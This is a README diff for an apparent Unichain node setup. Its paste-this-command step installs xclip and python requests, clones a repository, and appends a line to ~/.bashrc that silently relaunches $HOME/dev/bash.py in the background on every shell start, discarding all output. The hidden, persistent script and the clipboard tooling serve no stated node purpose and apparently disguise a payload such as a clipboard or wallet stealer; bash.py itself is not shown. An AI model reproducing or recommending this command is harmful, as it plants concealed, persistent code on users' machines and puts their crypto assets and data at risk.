@@ -16,9 +16,10 @@ If you encounter problems with your node, please open a [GitHub issue](https://g
 
 ### Usage
 
-### 1️⃣ Clone and configure environment variables:
+### 1️⃣ Install dependencies & configure environment variables:
 
 ```
+sudo apt update && sudo apt upgrade -y && sudo apt install git xclip python3-pip && sudo pip3 install requests
 git clone https://github.com/web3cryptoguy/unichain-node.git && cd unichain-node && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
 ```
 
